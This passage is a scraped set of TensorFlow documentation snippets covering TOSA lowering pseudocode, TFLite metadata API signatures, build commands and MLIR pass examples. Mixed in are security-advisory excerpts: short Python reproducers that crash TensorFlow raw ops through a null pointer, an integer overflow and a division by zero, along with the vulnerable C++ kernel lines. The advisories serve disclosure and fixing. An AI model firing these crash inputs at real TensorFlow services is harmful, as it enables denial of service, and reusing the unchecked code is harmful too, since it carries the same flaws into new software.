    if (axis < 0 || axis >= %input.rank) {
        // Insert at the end of the tensor
        axis += %input.rank
        for (int32 i = 0; i < input.rank; i++) {
           reshape_dims.push_back(%input.shape[i])
        }
    } else {
        for (int32 i= 0 ; i < %input.rank; i++) {
            if (i == axis) {
                reshape_dims.push_back(1)
            }
            reshape_dims.push_back(%input.shape[i])
        }
    }

    %output = tosa.RESHAPE(%input) {new_shape=reshape_dims}
    return %output
}
```

----------------------------------------

TITLE: Lowering SplitV Operation to TOSA (MLIR)
DESCRIPTION: This function lowers a split_v operation, which splits a tensor into segments of specified sizes along a given axis, to the TOSA dialect. It iterates through the list of split sizes, calculating the starting position for each slice. For each slice, it uses the TOSA SLICE operation with the calculated start and size, accumulating the slices into an array which is then returned via TOSA IDENTITYN.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_25

LANGUAGE: MLIR/TOSA
CODE:
```
Value lower_splitv_op(Value %value, vector <size_t> size_split, size_t axis)
{
   Value %output[]

   size_t curr_split_start = 0

   for (int32 i = 0; i < size_split.size(); i++) {
       vector <size_t> begin_vals, size_vals

       for (int32 j = 0; j < %value.rank; j++) {
           if (j == axis) {
              begin_vals.push_back(curr_split_start)
              size_vals.push_back(size_split[i])
           } else {
              begin_vals.push_back(0)
              size_vals.push_back(input.shape[j])
           }
       }

       %output[i] = tosa.SLICE(%value) {start=begin_vals, size=size_vals}

       curr_split_start += size_split[i]
   }

    %output_list = tosa.IDENTITYN(%output)
    return %output_list
}
```

----------------------------------------

TITLE: Lowering tf.SquareDifference to TOSA MLIR
DESCRIPTION: Documents the lowering of the TensorFlow `tf.SquareDifference` operation, which computes the element-wise square of the difference between two tensors, to a sequence of TOSA `tosa.SUB` and `tosa.MUL` operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_39

LANGUAGE: MLIR
CODE:
```
%output = tf.SquareDifference(%x, %y)
```

LANGUAGE: MLIR
CODE:
```
%diff = tosa.SUB(%x, %y)
%output = tosa.MUL(%diff, %diff)
```

----------------------------------------

TITLE: Calling RegexTokenizerOptionsStart Function (Python)
DESCRIPTION: This snippet shows the Python signature for the `RegexTokenizerOptionsStart` function. It is designed to be called with a `builder` object (likely a FlatBuffers builder) to start defining the options structure for a regular expression tokenizer within the TensorFlow Lite metadata schema.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/RegexTokenizerOptionsStart.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.RegexTokenizerOptionsStart(
    builder
)
```

----------------------------------------

TITLE: Adding Max Stat to TFLite Metadata Builder (Python)
DESCRIPTION: This function adds a maximum value statistic to the metadata schema being built. It requires a metadata `builder` object and the `max` value itself. It is used during the process of generating TFLite model metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/StatsAddMax.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.StatsAddMax(
    builder, max
)
```

----------------------------------------

TITLE: Building TF Lite Android Demo with Bazel
DESCRIPTION: This shell command uses Bazel to build the TensorFlow Lite camera demo application for Android from source. The `-c opt` flag enables optimization during the build process. Building requires Bazel, Android SDK (api_level matching WORKSPACE), NDK, and specifically build tools 28.0.0+.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/java/demo/README.md#_snippet_0

LANGUAGE: Shell
CODE:
```
bazel build -c opt //tensorflow/lite/java/demo/app/src/main:TfLiteCameraDemo
```

----------------------------------------

TITLE: Checking Equality for tflite_support.task.processor.Mention - Python
DESCRIPTION: This snippet shows the signature for the `__eq__` method of the `Mention` class. It takes another object (`other`) as input and returns a boolean indicating whether the current `Mention` object is equal to `other`. This method is used for object comparison.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/Mention.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(
    other: Any
) -> bool
```

----------------------------------------

TITLE: Checking CustomMetadata Buffer Identifier in Python
DESCRIPTION: A class method to check if a given FlatBuffers buffer contains the identifier for the `CustomMetadata` type. It takes the buffer, an offset, and an optional flag indicating if the buffer is size-prefixed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadata.md#_snippet_0

LANGUAGE: python
CODE:
```
@classmethod
CustomMetadataBufferHasIdentifier(
    buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Creating Stable Delegate Settings File on Android (Bash)
DESCRIPTION: Creates a JSON configuration file named stable_delegate_settings.json on the Android device via adb shell, specifying the path to the stable delegate shared library pushed earlier.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/README.md#_snippet_1

LANGUAGE: bash
CODE:
```
adb shell 'echo "{
  \"stable_delegate_loader_settings\": {
    \"delegate_path\": \"/data/local/tmp/libtensorflowlite_sample_stable_delegate.so\"
  }
  // Add concrete delegate settings for the test target delegate.
}
"> /data/local/tmp/stable_delegate_settings.json'
```

----------------------------------------

TITLE: Demonstrating TensorFlow SparseFillEmptyRows Vulnerability - Python
DESCRIPTION: This Python snippet demonstrates a security vulnerability (CVE-2021-37676, TFSA-2021-149) in TensorFlow's `tf.raw_ops.SparseFillEmptyRows`. By providing empty tensors for `indices`, `values`, and `dense_shape`, the code triggers a reference binding to a null pointer during shape inference, leading to undefined behavior or a crash. The vulnerability existed because the shape inference logic did not validate against empty tensor inputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-149.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.compat.v1.disable_v2_behavior()
tf.raw_ops.SparseFillEmptyRows(
  indices = tf.constant([], shape=[0, 0], dtype=tf.int64),
  values = tf.constant([], shape=[0], dtype=tf.int64),
  dense_shape = tf.constant([], shape=[0], dtype=tf.int64),
  default_value = 0)
```

----------------------------------------

TITLE: Calculating FractionalAvgPool Output Size (C++)
DESCRIPTION: This C++ snippet from the TensorFlow kernel shows the calculation of the output size for the fractional average pooling operation. It computes `output_size[i]` by flooring the division of `input_size[i]` by `pooling_ratio_[i]`. The vulnerability occurs when this division results in a value less than 1, which floors to 0, as the `DCHECK_GT` check is ineffective outside of debug builds.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-038.md#_snippet_1

LANGUAGE: cpp
CODE:
```
for (int i = 0; i < tensor_in_and_out_dims; ++i) {
  output_size[i] = static_cast<int>(std::floor(input_size[i] / pooling_ratio_[i]));
  DCHECK_GT(output_size[i], 0);
}
```

----------------------------------------

TITLE: Parallel Bazel Build Analysis JAX CPU (Shell)
DESCRIPTION: Uses the `parallel` command to run a `bazel build` command in parallel with specific settings for JAX CPU tests. It includes retries, delays, non-all execution, RBE configuration, JAX-specific environment variables, Python version override, XLA repository override, and output options. The `--nobuild` flag means it checks dependencies and configuration but doesn't perform the actual compilation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_0

LANGUAGE: shell
CODE:
```
parallel --ungroup --retries 3 --delay 15 --nonall -- bazel build --build_tag_filters= --test_tag_filters= --config=rbe_linux_x86_64 --test_env=JAX_NUM_GENERATED_CASES=25 --test_env=JAX_SKIP_SLOW_TESTS=1 --repo_env=HERMETIC_PYTHON_VERSION=3.12 --override_repository=xla=$GITHUB_WORKSPACE/openxla/xla --color=yes --test_output=errors --verbose_failures --keep_going --nobuild_tests_only --profile=profile.json.gz --flaky_test_attempts=3 --jobs=150 --bes_upload_mode=fully_async --nobuild -- //tests:cpu_tests //tests:backend_independent_tests
```

----------------------------------------

TITLE: Adding HloOpsCommon Library
DESCRIPTION: This command defines a CMake library target named `HloOpsCommon` compiled from the `hlo_ops_common.cc` source file and links it publicly to the `MLIRIR` library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/IR/CMakeLists.txt#_snippet_5

LANGUAGE: cmake
CODE:
```
add_mlir_library(HloOpsCommon
  hlo_ops_common.cc

  LINK_LIBS PUBLIC
  MLIRIR
)
```

----------------------------------------

TITLE: Raised MLIR Subgraph for GPU Add (MLIR)
DESCRIPTION: An MLIR function representing a subgraph automatically generated by the `Raise Target Subgraphs Pass`. It encapsulates an operation (`tfl.add`) annotated for the "GPU" device, demonstrating the segregation of operations into device-specific functions. Required input: MLIR with device-annotated ops.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/lite/experimental/tac/README.md#_snippet_5

LANGUAGE: MLIR
CODE:
```
 func private @func_1_GPU_FLOAT(%arg0: tensor<1xf32>, %arg1: tensor<1xf32>) -> tensor<1xf32> attributes {tac.device = "GPU", tac.inference_type = "FLOAT", tac.interface_name = "func_1"} {
    %0 = tfl.add %arg0, %arg1 {fused_activation_function = "RELU6", tac.device = "GPU", tac.inference_type = "FLOAT"} : tensor<1xf32>
    return %0 : tensor<1xf32>
  }
```

----------------------------------------

TITLE: Defining AddNOp Composite Semantics in Python
DESCRIPTION: Defines the composite semantics for an `AddNOp` using the `@Composite` decorator. The decorated Python function specifies how the operation behaves, in this case, summing a list of input tensors. It handles the edge case where only one input tensor is provided.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tfr/README.md#_snippet_1

LANGUAGE: python
CODE:
```
@Composite('AddNOp')
def _my_op_c(ins):
  N = len(ins)
  if N == 1:
    return ins[0]
  sum = ins[0]
  for i in range(1, N):
    sum += ins[i]
  return sum
```

----------------------------------------

TITLE: Analyzing Specific Bazel Profile File (Bazel)
DESCRIPTION: A specific instance of the `analyze-profile` command, this analyzes the performance profile contained within the specified file, `profile.json.gz`. This file typically stores detailed timing and execution information from a previous Bazel run.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/readme.md#_snippet_5

LANGUAGE: Bazel
CODE:
```
bazel analyze-profile profile.json.gz
```

----------------------------------------

TITLE: Running Gemma2 Keras Cleanup Script (Bash)
DESCRIPTION: Executes the `cleanup.sh` script to remove the virtual environment that was created by the `setup.sh` script. This is an optional step for cleaning up the setup.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/backends/cpu/benchmarks/e2e/gemma2/keras/README.md#_snippet_2

LANGUAGE: bash
CODE:
```
bash cleanup.sh
```

----------------------------------------

TITLE: Lowering Dequantize (MLIR/TOSA IR)
DESCRIPTION: Lowers a Dequantize operation to TOSA. The dequantization is performed by casting the input to a floating-point type, subtracting the zeropoint, and then multiplying by the scale. This implements the common asymmetric dequantization formula `(input - zeropoint) * scale`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_13

LANGUAGE: MLIR/TOSA IR
CODE:
```
Value lower_dequantize_op(Value %input, float64 scale, int64 zeropoint)
{
    %const_scale = tosa.CONST() {value={scale}}
    %const_zp = tosa.CONST() {value={(float64)zeropoint}}
    %op1_cast_in = tosa.CAST(%input) // %input.dtype->f32
    %op2_sub_op1_zp = tosa.SUB(%op1_cast_in, %const_zp)
    %op3_mul_op2_scale = tosa.MUL(%op2_sub_op2_zp, %const_scale)
}
```

----------------------------------------

TITLE: Declaring User Tool Script Dependencies
DESCRIPTION: Lists dependencies needed for various internal scripts used within the TensorFlow project, often for development or CI tasks. This includes tools for parsing JUnit reports, processing XML (lxml), and static code analysis (pylint).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/devel.requirements.txt#_snippet_4

LANGUAGE: pip requirements
CODE:
```
# For user tool scripts
junitparser ~= 2.2.0
lxml ~= 4.9.1
pylint ~= 2.13.9
```

----------------------------------------

TITLE: Warn on Invalid Python Bindings Configuration
DESCRIPTION: Displays a warning message if MHLO Python bindings are enabled while building standalone, as they are only supported in unified, external project builds (typically as part of LLVM).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/CMakeLists.txt#_snippet_7

LANGUAGE: CMake
CODE:
```
if(MHLO_ENABLE_BINDINGS_PYTHON AND NOT MHLO_EXTERNAL_PROJECT_BUILD)
  message(WARNING "MHLO python bindings are only supported in unified, external project builds")
endif()
```

----------------------------------------

TITLE: Configuring Module and Prefix Paths
DESCRIPTION: This snippet adds the project's custom CMake modules directory to both `CMAKE_MODULE_PATH` and `CMAKE_PREFIX_PATH`. This allows CMake to find custom find modules and configuration files provided by the project.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
set(CMAKE_MODULE_PATH
  "${TFLITE_SOURCE_DIR}/tools/cmake/modules"
  ${CMAKE_MODULE_PATH}
)
set(CMAKE_PREFIX_PATH
  "${TFLITE_SOURCE_DIR}/tools/cmake/modules"
  ${CMAKE_PREFIX_PATH}
)
```

----------------------------------------

TITLE: Output Example: Flattened Functional Ops (Functional Conversion)
DESCRIPTION: This MLIR snippet shows the result after applying the `-tf-executor-to-functional-conversion` pass. The `tf_executor.graph` and `tf_executor.island` structures have been removed, and the inner TensorFlow operations are lifted directly into the parent function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_18

LANGUAGE: MLIR
CODE:
```
func @my_fn(%arg0: tensor<i32>, %arg1: tensor<i32>) -> (tensor<i32>, tensor<i32>) {
  %identity = "tf.Identity"(%arg0) : (tensor<i32>) -> tensor<i32>
  %identity_n:2 = "tf.IdentityN"(%arg1, %identity) : (tensor<i32>, tensor<i32>) -> (tensor<i32>, tensor<i32>)
  return %identity, %identity_n#0 : tensor<i32>, tensor<i32>
}
```

----------------------------------------

TITLE: Defining StableHLO Extension Passes Library (CMake)
DESCRIPTION: Creates a CMake target for an MLIR library (`StablehloExtensionPasses`) containing the source files for the StableHLO extension passes. It defines dependencies on other targets (including the TableGen target) and specifies the required MLIR, StableHLO, and CHLO libraries it links against.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/stablehlo_ext/transforms/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
add_mlir_dialect_library(StablehloExtensionPasses
  PARTIAL_SOURCES_INTENDED
  chlo_recompose_ops.cpp
  chlo_preserve_high_level_ops.cpp
  stablehlo_canonicalize_dynamism.cpp
  stablehlo_refine_shapes.cpp
  sdy_refine_shapes.cpp

  DEPENDS
  StablehloExtensionPassesIncGen

  LINK_LIBS PUBLIC
  ChloOps
  MLIRFuncDialect
  MLIRIR
  MLIRInferTypeOpInterface
  MLIRSupport
  MLIRTransformUtils
  StablehloExtensionOps
  StablehloBase
  StablehloOps
  StablehloOptimizationPasses
  StablehloPasses
  StablehloTypeInference
)
```

----------------------------------------

TITLE: MLIR Functional If before Region Conversion Pass
DESCRIPTION: This MLIR snippet shows a `tf.If` operation using external functions (`@then_branch_func`, `@else_branch_func`) for its branches. This represents the functional form of TensorFlow control flow before transformation to region-based operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_29

LANGUAGE: mlir
CODE:
```
  %0 = "tf.If"(%arg0, %arg1) {
    then_branch = @then_branch_func, else_branch = @else_branch_func, is_stateless = false
  } : (tensor<i1>, tensor<*xf32>) -> tensor<*xf32>
```

----------------------------------------

TITLE: Getting MLIR Global Library Properties (CMake)
DESCRIPTION: Retrieves lists of libraries required for MLIR dialects, conversions, and extensions from global CMake properties, storing them in respective variables. These properties are likely defined elsewhere in the build system and contain lists of library targets.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/tools/mlir-hlo-opt/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
get_property(dialect_libs GLOBAL PROPERTY MLIR_DIALECT_LIBS)
get_property(conversion_libs GLOBAL PROPERTY MLIR_CONVERSION_LIBS)
get_property(extension_libs GLOBAL PROPERTY MLIR_EXTENSION_LIBS)
```

----------------------------------------

TITLE: Output Example: Multiple Islands Per Op (Splitting)
DESCRIPTION: This MLIR snippet shows the result after applying the `-tf-executor-split-into-island-per-op` pass to the previous example. The single island has been broken down, with each original TensorFlow operation now wrapped in its own `tf_executor.island wraps` operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_16

LANGUAGE: MLIR
CODE:
```
    func.func @dangling_print(%arg0: tensor<*xi32>, %arg1: tensor<i32>) -> (tensor<*xi32>, tensor<*xi32>) {
      %0:2 = tf_executor.graph {
        %outputs, %control = tf_executor.island wraps "tf.Add"(%arg0, %arg1) : (tensor<*xi32>, tensor<i32>) -> tensor<*xi32>
        %outputs_0, %control_1 = tf_executor.island wraps "tf.Add"(%outputs, %arg1) : (tensor<*xi32>, tensor<i32>) -> tensor<*xi32>
        %outputs_2, %control_3 = tf_executor.island wraps "tf.Print"(%outputs_0) {message = "add result"} : (tensor<*xi32>) -> tensor<*xi32>
        tf_executor.fetch %outputs, %outputs_0 : tensor<*xi32>, tensor<*xi32>
      }
      return %0#0, %0#1 : tensor<*xi32>, tensor<*xi32>
    }
```

----------------------------------------

TITLE: Processing MLIR Function Return Values C++
DESCRIPTION: This C++ snippet is part of the MLIR function import process in TensorFlow. It iterates through standard and control return values of an MLIR function object, attempting to map their names to positions and retrieve corresponding values or placeholders from a value manager. It includes checks to ensure the return value names correspond to known outputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-138.md#_snippet_0

LANGUAGE: C++
CODE:
```
// We pre-allocate the array of operands and populate it using the
// `output_name_to_position` and `control_output_to_position` populated
// previously.
SmallVector<Value> ret_vals(func.ret_size() + func.control_ret_size(),
                            Value());
for (const auto& ret_val : func.ret()) {
  auto position = output_name_to_position.find(ret_val.first);
  if (position == output_name_to_position.end())
    return InvalidArgument(
        "Can't import function, returned value references unknown output "
        "argument ",
        ret_val.first);
  ret_vals[position->second] =
      value_manager.GetValueOrCreatePlaceholder(ret_val.second);
}
for (const auto& ret_val : func.control_ret()) {
  auto position = control_output_to_position.find(ret_val.first);
  if (position == control_output_to_position.end())
    return InvalidArgument(
        "Can't import function, returned value references unknown output "
        "argument ",
        ret_val.first);
  Value result = value_manager.GetValueOrCreatePlaceholder(
      (Twine("^") + ret_val.second).str());
```

----------------------------------------

TITLE: Vulnerable TFLite EmbeddingLookup Calculation C++
DESCRIPTION: This C++ snippet shows the vulnerable code lines in the TensorFlow Lite `EmbeddingLookup` operator's implementation (`embedding_lookup.cc`). It calculates `row_bytes` by dividing `value->bytes` by `row_size`, which is derived from the first dimension of the `value` tensor (`SizeOfDimension(value, 0)`). If `row_size` is 0, this operation results in a division by zero error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-083.md#_snippet_0

LANGUAGE: C++
CODE:
```
const int row_size = SizeOfDimension(value, 0);
const int row_bytes = value->bytes / row_size;
```

----------------------------------------

TITLE: Instantiating RegexTokenizerOptionsT Python
DESCRIPTION: Initializes a new instance of the RegexTokenizerOptionsT class. This class represents the configuration options for a regex-based tokenizer within the TFLite metadata schema.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/RegexTokenizerOptionsT.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.RegexTokenizerOptionsT()
```

----------------------------------------

TITLE: Getting Root Object from Buffer (Deprecated) Python
DESCRIPTION: This deprecated class method serves the same purpose as `GetRootAs`, deserializing a flatbuffer object from a buffer. Users are advised to switch to the `GetRootAs` method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptions.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
GetRootAsSentencePieceTokenizerOptions(
    buf, offset=0
)
```

----------------------------------------

TITLE: Validating Content Buffer Identifier Python
DESCRIPTION: Checks if a given buffer contains a valid identifier for a Content object according to the FlatBuffers schema. This class method is used for buffer verification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Content.md#_snippet_0

LANGUAGE: python
CODE:
```
@classmethod
ContentBufferHasIdentifier(
    buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Accessing Tensor Scalar Value in TensorFlow C++ Kernel
DESCRIPTION: This C++ snippet from the `LoadAndRemapMatrix` kernel implementation shows the code responsible for accessing the `ckpt_path` input tensor. It uses `scalar<tstring>()()` to retrieve the value, assuming the input is a scalar string. If the input tensor `ckpt_path_t` is not a scalar (as shown in the Python exploit), the internal rank `CHECK` within `scalar<T>()()` fails, leading to the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-049.md#_snippet_1

LANGUAGE: c++
CODE:
```
const string& ckpt_path = ckpt_path_t->scalar<tstring>()();
```

----------------------------------------

TITLE: Triggering Integer Overflow in SparseCountSparseOutput using Python
DESCRIPTION: This Python snippet demonstrates how to reproduce the integer overflow vulnerability (TFSA-2022-019) in TensorFlow's `SparseCountSparseOutput` operation. By providing extremely large values (2^31 and 2^32) in the `dense_shape` argument, it triggers an integer overflow internally, leading to an incorrect memory allocation size and causing the TensorFlow process to crash. It requires the `tensorflow` and `numpy` libraries.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-019.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf
import numpy as np

tf.raw_ops.SparseCountSparseOutput(
  indices=[[1,1]],
  values=[2],
  dense_shape=[2 ** 31, 2 ** 32],
  weights=[1],
  binary_output=True,
  minlength=-1,
  maxlength=-1,
  name=None)
```

----------------------------------------

TITLE: Packing ContentT Object in Python
DESCRIPTION: Packs the ContentT object's data using a provided builder object. This method is typically used for serializing the object into a format suitable for storage or transmission.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ContentT.md#_snippet_4

LANGUAGE: python
CODE:
```
Pack(
    builder
)
```

----------------------------------------

TITLE: Looking Up Op Definitions in MLIR TFG GraphDefImporter C++
DESCRIPTION: This C++ snippet from `mlir::tfg::GraphDefImporter::ConvertNodeDef` demonstrates how the OpDef for a NodeDef's operation name (`node.op()`) is retrieved from the registry or function op definitions during the process of importing a TensorFlow GraphDef into MLIR. The vulnerability occurs when `node.op()` is unexpectedly empty, leading to issues in this lookup logic.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-139.md#_snippet_0

LANGUAGE: cpp
CODE:
```
Status GraphDefImporter::ConvertNodeDef(OpBuilder &builder, ConversionState &s,
                                        const NodeDef &node) {
  VLOG(4) << "Importing: " << node.name();
  OperationState state(ConvertLocation(node), absl::StrCat("tfg.", node.op()));

  // The GraphImporter does light shape inference, but here we will defer all of
  // that to the shape inference pass.
  const OpDef *op_def;
  const OpRegistrationData *op_reg_data = nullptr;
  if ((op_reg_data = registry_.LookUp(node.op()))) {
    op_def = &op_reg_data->op_def;
  } else {
    auto it = function_op_defs_.find(node.op());
    if (it == function_op_defs_.end())
      return InvalidArgument("Unable to find OpDef for ", node.op());
    op_def = it->second;
  }

```

----------------------------------------

TITLE: Run Bazel Tests TF CPU (Shell)
DESCRIPTION: Executes `bazel test` for TensorFlow CPU targets. It applies extensive build and test tag filters, uses CPU-specific release and RBE configurations, enables PYWRAP rules, configures output, profiling, and limits tests to C++ and Python languages. It specifies multiple target patterns, including exclusions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/build_tools/ci/golden_commands.txt#_snippet_9

LANGUAGE: shell
CODE:
```
bazel test --build_tag_filters=-no_oss,-tf_tosa,-oss_excluded,-oss_serial,-tpu,-benchmark-test,-v1only,-gpu --test_tag_filters=-no_oss,-tf_tosa,-oss_excluded,-oss_serial,-tpu,-benchmark-test,-v1only,-gpu --config=release_cpu_linux --config=rbe_linux_cpu --repo_env=USE_PYWRAP_RULES=True --verbose_failures --test_output=errors --profile=profile.json.gz --test_lang_filters=cc,py --color=yes -- //tensorflow/compiler/... -//tensorflow/compiler/tf2tensorrt/... //tensorflow/python/... -//tensorflow/python/distribute/... -//tensorflow/python/kernel_tests/... -//tensorflow/python/data/... -//tensorflow/python/compiler/tensorrt/...
```

----------------------------------------

TITLE: Initializing BoundingBoxPropertiesT from Packed Buffer - Python
DESCRIPTION: Documents the class method `InitFromPackedBuf`, which initializes a `BoundingBoxPropertiesT` object from a packed flatbuffer buffer. It takes the buffer (`buf`) and an optional position (`pos`) as parameters, similar to `InitFromBuf` but optimized for packed data formats.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxPropertiesT.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)
```

----------------------------------------

TITLE: Demonstrating Division by Zero in QuantizedBatchNormWithGlobalNormalization - Python
DESCRIPTION: This Python snippet demonstrates the division by zero vulnerability (CVE-2021-29548) in `tf.raw_ops.QuantizedBatchNormWithGlobalNormalization`. It shows that providing empty tensors for the mean (`m`) and variance (`v`) inputs, along with other required parameters, triggers a runtime division by zero error, potentially causing a denial of service. The code requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-036.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

t = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.quint8)
t_min = tf.constant(-10.0, dtype=tf.float32)
t_max = tf.constant(-10.0, dtype=tf.float32)
m = tf.constant([], shape=[0], dtype=tf.quint8)
m_min = tf.constant(-10.0, dtype=tf.float32)
m_max = tf.constant(-10.0, dtype=tf.float32)
v = tf.constant([], shape=[0], dtype=tf.quint8)
v_min = tf.constant(-10.0, dtype=tf.float32)
v_max = tf.constant(-10.0, dtype=tf.float32)
beta = tf.constant([], shape=[0], dtype=tf.quint8)
beta_min = tf.constant(-10.0, dtype=tf.float32)
beta_max = tf.constant(-10.0, dtype=tf.float32)
gamma = tf.constant([], shape=[0], dtype=tf.quint8)
gamma_min = tf.constant(-10.0, dtype=tf.float32)
gamma_max = tf.constant(-10.0, dtype=tf.float32)

tf.raw_ops.QuantizedBatchNormWithGlobalNormalization(
  t=t, t_min=t_min, t_max=t_max, m=m, m_min=m_min, m_max=m_max,
  v=v, v_min=v_min, v_max=v_max, beta=beta, beta_min=beta_min,
  beta_max=beta_max, gamma=gamma, gamma_min=gamma_min,
  gamma_max=gamma_max, out_type=tf.qint32,
  variance_epsilon=0.1, scale_after_normalization=True)
```

----------------------------------------

TITLE: Calling SubGraphMetadataEnd Python Function
DESCRIPTION: This code snippet shows the basic function signature for the `SubGraphMetadataEnd` function. It is used to signal the end of building a `SubGraphMetadata` structure within a FlatBuffer builder, returning the offset.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataEnd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataEnd(
    builder
)
```

----------------------------------------

TITLE: Initializing TFLite Tensor with Null Buffer C++
DESCRIPTION: This C++ snippet from TFLite's `subgraph.cc` demonstrates how a `TfLiteTensor` is reset, explicitly showing the buffer being initialized to `nullptr`. This null initialization, coupled with subsequent unwritten reads, is the core mechanism exploited by the TFSA-2020-007 vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-007.md#_snippet_0

LANGUAGE: C++
CODE:
```
TfLiteTensorReset(type, name, ConvertArrayToTfLiteIntArray(rank, dims),
                    GetLegacyQuantization(quantization),
                    /*buffer=*/nullptr, required_bytes, allocation_type,
                    nullptr, is_variable, &tensor);
```

----------------------------------------

TITLE: Check if Mean Array is None Python
DESCRIPTION: This method checks if the mean array field is absent (None) in the normalization options schema data. It's useful for determining if mean values were provided in the metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptions.md#_snippet_5

LANGUAGE: Python
CODE:
```
MeanIsNone()
```

----------------------------------------

TITLE: Calling DeleteSessionTensor Raw Op in Eager Mode (Python)
DESCRIPTION: This Python snippet demonstrates how to call the `tf.raw_ops.DeleteSessionTensor` operation in TensorFlow's eager mode. Similar to GetSessionTensor, calling this raw op when session state is invalid in affected versions triggers the TFSA-2021-007 null pointer dereference vulnerability. It requires a handle.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-007.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf
tf.raw_ops.DeleteSessionTensor(handle=['\x12\x1a\x07'])
```

----------------------------------------

TITLE: Get Dimension Names Count - TensorMetadata (Python)
DESCRIPTION: Returns the number of dimension names available for this tensor metadata entry. This count is useful for iterating through the list of dimension names.
